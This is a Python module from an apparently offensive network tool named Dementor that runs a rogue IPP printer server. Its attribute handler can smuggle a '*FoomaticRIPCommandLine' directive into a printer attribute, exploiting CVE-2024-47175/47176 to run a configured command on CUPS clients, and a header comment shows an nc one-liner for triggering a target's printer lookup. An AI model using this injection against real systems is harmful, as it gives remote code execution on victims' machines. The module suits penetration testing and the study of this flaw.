# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Reference:
#   - https://datatracker.ietf.org/doc/html/rfc8010
#   - https://github.com/istopwg/pwg-books/blob/master/ippguide/ippguide.pdf
#
# Notes:
#   To trigger a new printer lookup, a specially crafted CUPS browsing request
#   has to be sent over UDP to the CUPS server. The format is as follows:
#
#     BROWSED_REQUEST := 0 <SPACE> 3 <SPACE> <URL> <SPACE> "<LOCATION>" <SPACE> "<INFO>"
#
#   The URL must point to the rogue IPP server, INFO can be any string, and
#   LOCATION will be populated to the user when the printer is selected.
#
#   The following commands can be used to trigger a printer lookup:
#      echo '0 3 http://<IP>:<PORT>/printers/test "loc" "info"' | nc -nu <TARGET_IP> 631
import socket

from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

from rich import markup
from pyipp import parser as IppParser, serializer as IppSerializer
from pyipp.enums import IppOperation, IppPrinterState, IppStatus, IppTag
from pyipp.tags import ATTRIBUTE_TAG_MAP

from dementor.config.toml import Attribute as A, TomlConfig
from dementor.config.util import format_string
from dementor.logger import ProtocolLogger, dm_logger
from dementor.servers import ServerThread, bind_server
from dementor.database import normalize_client_address

# [5.1.10.  'mimeMediaType']
IPP_MIME_MEDIA_TYPES = [
    "text/html",
    "text/plain",
    "text/plain; charset = US-ASCII",
    "text/plain; charset = ISO-8859-1",
    "text/plain; charset = utf-8",
    "application/postscript",
    "application/vnd.hp-PCL",
    "application/pdf",
    "application/octet-stream",
]

# [5.4.14.  ipp-versions-supported]
IPP_SUPPORTED_VERSIONS = ["1.0", "1.1", "2.0", "2.1", "2.2"]

# Add a few more printer attributes
ATTRIBUTE_TAG_MAP.update(
    {
        # Table 16: Printer Description Attributes (READ-WRITE)
        "charset-configured": IppTag.CHARSET,
        "charset-supported": IppTag.CHARSET,
        "color-supported": IppTag.BOOLEAN,
        "compression-supported": IppTag.KEYWORD,
        "document-format-default": IppTag.MIME_TYPE,
        "document-format-supported": IppTag.MIME_TYPE,
        "generated-natural-language-supported": IppTag.LANGUAGE,
        "ipp-versions-supported": IppTag.KEYWORD,
        "job-impressions-supported": IppTag.INTEGER,
        "job-k-octets-supported": IppTag.INTEGER,
        "job-media-sheets-supported": IppTag.INTEGER,
        "multiple-document-jobs-supported": IppTag.BOOLEAN,
        "multiple-operation-time-out": IppTag.INTEGER,
        "natural-language-configured": IppTag.LANGUAGE,
        "operations-supported": IppTag.ENUM,
        "pdl-override-supported": IppTag.KEYWORD,
        "printer-driver-installer": IppTag.URI,
        "printer-info": IppTag.TEXT,
        "printer-location": IppTag.TEXT,
        "printer-make-and-model": IppTag.TEXT,
        "printer-message-from-operator": IppTag.TEXT,
        "printer-more-info-manufacturer": IppTag.URI,
        "printer-name": IppTag.NAME,
        "reference-uri-schemes-supported": IppTag.URI_SCHEME,
        # Table 17: Printer Status Attributes (READ-ONLY)
        "pages-per-minute-color": IppTag.INTEGER,
        "pages-per-minute": IppTag.INTEGER,
        "printer-current-time": IppTag.DATE,
        "printer-is-accepting-jobs": IppTag.BOOLEAN,
        "printer-more-info": IppTag.URI,
        "printer-state": IppTag.ENUM,
        "printer-state-message": IppTag.TEXT,
        "printer-state-reasons": IppTag.KEYWORD,
        "printer-up-time": IppTag.INTEGER,
        "printer-uri-supported": IppTag.URI,
        "queued-job-count": IppTag.INTEGER,
        "uri-authentication-supported": IppTag.KEYWORD,
        "uri-security-supported": IppTag.KEYWORD,
        # other
        "printer-privacy-policy-uri": IppTag.URI,
        "printer-dns-sd-name": IppTag.NAME,
        "printer-device-id": IppTag.TEXT,
    }
)


class IPPConfig(TomlConfig):
    _section_ = "IPP"
    _fields_ = [
        A("ipp_port", "Port", 631),
        A("ipp_server_type", "ServerType", "IPP/1.1", factory=format_string),
        A("ipp_supported_formats", "DocumentFormats", IPP_MIME_MEDIA_TYPES),
        A("ipp_supported_versions", "SupportedVersions", IPP_SUPPORTED_VERSIONS),
        A("ipp_default_format", "DefaultDocumentFormat", "text/plain"),
        A("ipp_driver_uri", "DriverUri", None),
        A("ipp_printer_name", "PrinterName", None),
        A("ipp_printer_info", "PrinterInfo", "Printer Info"),
        A("ipp_printer_location", "PrinterLocation", "outside"),
        A("ipp_printer_model", "PrinterModel", "HP 8.0"),
        A("ipp_extra_attrib", "ExtraAttributes", None),
        A("ipp_extra_headers", "ExtraHeaders", None),
        A("ipp_supported_operations", "SupportedOperations", None),
        A("ipp_remote_cmd", "RemoteCmd", None),
        A("ipp_remote_cmd_attr", "RemoteCmdAttribute", "printer-privacy-policy-uri"),
        A("ipp_remote_cmd_filter", "RemoteCmdCupsFilter", None),
    ]

    def set_ipp_supported_operations(self, value):
        self.ipp_supported_operations = [
            IppOperation[operation] if isinstance(operation, str) else operation
            for operation in (value or [])
        ]

    def set_ipp_extra_attrib(self, extra: list):
        # A list of attributes to add to the GET-PRINTER-ATTRIBUTES response.
        # This settings can also be used to add custom attributes to the
        # ATTRIBUTE_TAG_MAP.
        self.ipp_extra_attrib = {}
        for attrib_config in [] if not isinstance(extra, list) else extra:
            name = attrib_config.get("name")
            if not name:
                dm_logger.warning(f"Missing name for extra attribute: {attrib_config}")
                continue

            tag = attrib_config.get("tag")
            match tag:
                case int():
                    ATTRIBUTE_TAG_MAP[name] = IppTag(tag)
                case str():
                    ATTRIBUTE_TAG_MAP[name] = IppTag[tag]
                case _:
                    dm_logger.warning(f"Invalid tag for extra attribute: {tag!r}")
                    continue

            value = attrib_config.get("value")
            if value is not None:
                self.ipp_extra_attrib[name] = value


def apply_config(session):
    session.ipp_config = TomlConfig.build_config(IPPConfig)


def create_server_threads(session):
    address = (session.bind_address, session.ipp_config.ipp_port)
    if session.ipp_enabled:
        yield ServerThread(
            session, IPPServer, server_address=address, ipv6=bool(session.ipv6)
        )


# --- IPP Constants ---

# [4.1.4.2.  Response Operation Attributes]
ATTRIB_CHARSET = "attributes-charset"
ATTRIB_NATURAL_LANGUAGE = "attributes-natural-language"


class IPPHandler(BaseHTTPRequestHandler):
    default_request_version = "HTTP/1.1"
    request_version = default_request_version

    def __init__(self, session, config, request, client_address, server) -> None:
        self.config = config  # REVISIT: this is confusing
        self.session = session
        self.client_address = client_address
        self.setup_proto_logger()
        super().__init__(request, client_address, server)

    def setup_proto_logger(self):
        self.logger = ProtocolLogger(
            extra={
                "protocol": "IPP",
                "protocol_color": "spring_green1",
                "host": normalize_client_address(self.client_address[0]),
                "port": self.config.ipp_port,
            }
        )

    def send_response(self, code: int, message=None, document=None) -> None:
        self.logger.debug(
            markup.escape(f"{self.command} {self.path} {code}"), is_server=True
        )
        if not hasattr(self, "_headers_buffer"):
            self._headers_buffer = []

        super().send_response(code, message)
        self.send_header("Connection", "close")
        for header in self.config.ipp_extra_headers or []:
            self._headers_buffer.append(f"{header}\r\n".encode("utf-8", "strict"))

        if document is not None:
            data = IppSerializer.encode_dict(document)
            self.send_header("Content-Type", "application/ipp")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            self.wfile.flush()

    def version_string(self) -> str:
        return self.config.ipp_server_type

    @property
    def content_length(self) -> int:
        return int(self.headers.get("Content-Length", 0))

    @property
    def printer_name(self) -> str:
        return self.config.ipp_printer_name or self.path.split("/")[-1]

    @property
    def printer_uri(self) -> str:
        address = self.session.ipv4
        return (
            f"ipp://{address}:{self.config.ipp_port}/ipp/printers/{self.printer_name}"
        )

    def log_message(self, format: str, *args: Any) -> None:
        # let us log mssages
        pass

    def do_POST(self):
        # handle IPP request
        try:
            data = self.rfile.read(self.content_length)
            self.logger.debug(f"Ipp request data: {data.hex()}", is_client=True)
            req = IppParser.parse(data, contains_data=True)
        except Exception as e:
            self.send_error(HTTPStatus.BAD_REQUEST, "Bad Request")
            return self.logger.debug(f"Invalid IPP request: {e}")

        major, minor = req["version"]
        req_id = req["request-id"]
        operation = IppOperation(req["status-code"])
        self.logger.display(
            f"IPP-Request: <{operation.name}> (Version: {major}.{minor}, "
            f"ID: {req_id:#x})"
        )

        method = getattr(self, f"ipp_{operation.name.lower()}", None)
        if method is None:
            self.logger.debug(f"Unknown IPP operation: {operation.name}")
            self.send_error(HTTPStatus.NOT_FOUND, "Not Found")
        else:
            method(req)

    def ipp_get_printer_attributes(self, req: dict):
        # [4.2.5.  Get-Printer-Attributes Operation]
        # This REQUIRED operation allows a Client to request the values of the
        # attributes of a Printer.  In the request, the Client supplies the set
        # of Printer attribute names and/or attribute group names in which the
        # requester is interested.
        attrib = req["operation-attributes"]

        # [4.2.5.2.  Get-Printer-Attributes Response]
        resp_attrib = {}
        resp = {
            "version": req["version"],
            # "request-id": req["request-id"],
            "operation": IppStatus.OK,
            "operation-attributes-tag": {
                # Natural Language and Character Set
                ATTRIB_CHARSET: attrib[ATTRIB_CHARSET],
                ATTRIB_NATURAL_LANGUAGE: attrib[ATTRIB_NATURAL_LANGUAGE],
            },
            # "status-message" omitted
            "printer-attributes-tag": resp_attrib,
        }

        # Table 17: Printer Status Attributes (READ-ONLY)
        # | printer-is-accepting-jobs    | boolean              | REQUIRED    |
        resp_attrib["printer-is-accepting-jobs"] = True
        # | printer-state                | type1 enum           | REQUIRED    |
        resp_attrib["printer-state"] = IppPrinterState.IDLE
        # | printer-state-reasons        | 1setOf type2 keyword | REQUIRED    |
        # [5.4.12.  printer-state-reasons]
        #  - 'none': There are no reasons.
        resp_attrib["printer-state-reasons"] = ["none"]
        # | printer-up-time              | integer(1:MAX)       | REQUIRED    |
        resp_attrib["printer-up-time"] = 1  # random.randrange(1, 0xFFFF)
        # | printer-uri-supported        | 1setOf uri           | REQUIRED    |
        resp_attrib["printer-uri-supported"] = [self.printer_uri]
        # | queued-job-count             | integer(0:MAX)       | REQUIRED    |
        resp_attrib["queued-job-count"] = 0
        # | uri-authentication-supported | 1setOf type2 keyword | REQUIRED    |
        # [5.4.2.  uri-authentication-supported]
        # 'none': There is no authentication mechanism associated with the
        # URI. The Printer assumes that the authenticated user is
        # 'anonymous'.
        resp_attrib["uri-authentication-supported"] = ["none"]
        # | uri-security-supported       | 1setOf type2 keyword | REQUIRED    |
        resp_attrib["uri-security-supported"] = ["none"]

        # Table 16: Printer Description Attributes (READ-WRITE)
        # | charset-configured          | charset               | REQUIRED    |
        resp_attrib["charset-configured"] = attrib[ATTRIB_CHARSET]
        # | charset-supported           | 1setOf charset        | REQUIRED    |
        # [5.4.18.  charset-supported]
        # At least the value 'utf-8' MUST be present, since IPP objects MUST
        # support the UTF-8 [RFC3629] charset.
        resp_attrib["charset-supported"] = {attrib[ATTRIB_CHARSET], "utf-8"}
        # | color-supported             | boolean               | RECOMMENDED |
        resp_attrib["color-supported"] = True
        # | compression-supported       | 1setOf type2 keyword  | REQUIRED    |
        resp_attrib["compression-supported"] = ["none"]
        # | document-format-default     | mimeMediaType         | REQUIRED    |
        resp_attrib["document-format-default"] = self.config.ipp_default_format
        # | document-format-supported   | 1setOf mimeMediaType  | REQUIRED    |
        resp_attrib["document-format-supported"] = self.config.ipp_supported_formats
        # | generated-natural-language- | 1setOf                | REQUIRED    |
        # | supported                   | naturalLanguage       |             |
        resp_attrib["generated-natural-language-supported"] = [
            attrib[ATTRIB_NATURAL_LANGUAGE]
        ]
        # | ipp-versions-supported      | 1setOf type2 keyword  | REQUIRED    |
        resp_attrib["ipp-versions-supported"] = self.config.ipp_supported_versions
        # | natural-language-configured | naturalLanguage       | REQUIRED    |
        resp_attrib["natural-language-configured"] = attrib[ATTRIB_NATURAL_LANGUAGE]
        # | operations-supported        | 1setOf type2 enum     | REQUIRED    |
        # By default, we should support all standard operations
        resp_attrib["operations-supported"] = set(
            self.config.ipp_supported_operations
        ) | {i for i in range(0x002, 0x0013)}
        # | pdl-override-supported      | type2 keyword         | REQUIRED    |
        resp_attrib["pdl-override-supported"] = "not-attempted"
        # | printer-driver-installer    | uri                   |             |
        if self.config.ipp_driver_uri:
            resp_attrib["printer-driver-installer"] = self.config.ipp_driver_uri
        # | printer-info                | text(127)             | RECOMMENDED |
        if self.config.ipp_printer_info:
            resp_attrib["printer-info"] = self.config.ipp_printer_info
        # | printer-location            | text(127)             | RECOMMENDED |
        if self.config.ipp_printer_location:
            resp_attrib["printer-location"] = self.config.ipp_printer_location
        # | printer-make-and-model      | text(127)             | RECOMMENDED |
        if self.config.ipp_printer_model:
            resp_attrib["printer-make-and-model"] = self.config.ipp_printer_model
        # | printer-name                | name(127)             | REQUIRED    |
        resp_attrib["printer-name"] = self.printer_name

        msg = f"Serving IPP printer [i]{markup.escape(self.printer_name)}[/]"
        # CVE-2024-47175, CVE-2024-47176
        if self.config.ipp_remote_cmd:
            cups_filter = (
                self.config.ipp_remote_cmd_filter
                or "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
            )
            value = (
                f'{self.printer_uri}"\n*FoomaticRIPCommandLine: '
                f'"{self.config.ipp_remote_cmd}"\n'
                # The space here is very important!
                f'*cupsFilter2 : "{cups_filter}'
            )
            resp_attrib[self.config.ipp_remote_cmd_attr] = value
            cmd_text = self.config.ipp_remote_cmd
            if len(cmd_text) > 32:
                cmd_text = f"{cmd_text[:32]}..."
            msg = f"{msg} with remote command: {markup.escape(cmd_text)!r}"

        # allow extra configuration
        for key, value in (self.config.ipp_extra_attrib or {}).items():
            resp_attrib[key] = value

        self.logger.success(msg)
        self.send_response(HTTPStatus.OK, "OK", resp)


class IPPServer(ThreadingHTTPServer):
    service_name = "IPP"

    def __init__(
        self,
        session,
        server_address=None,
        RequestHandlerClass=None,
        ipv6=False,
    ) -> None:
        self.config = session
        self.server_config = session.ipp_config
        self.is_ipv6 = ipv6
        if self.is_ipv6:
            self.address_family = socket.AF_INET6

        address = server_address or (self.config.bind_address, 631)
        super().__init__(address, RequestHandlerClass or IPPHandler)

    def server_bind(self) -> None:
        bind_server(self, self.config)
        return super().server_bind()

    def finish_request(self, request, client_address) -> None:
        self.RequestHandlerClass(
            self.config, self.server_config, request, client_address, self
        )
